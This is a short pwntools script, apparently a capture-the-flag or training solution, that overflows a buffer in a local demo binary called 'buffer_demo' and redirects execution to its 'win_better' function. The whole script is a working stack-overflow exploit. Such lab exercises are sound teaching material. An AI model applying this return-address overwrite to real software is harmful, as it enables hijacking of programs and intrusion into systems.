from pwn import *

p = process('./buffer_demo')
elf = ELF('./buffer_demo')

payload = b'A' * (0x34 - 0xC)
payload += p32(elf.symbols['win_better'])

p.sendlineafter(b'password', payload)

p.interactive()
p.close()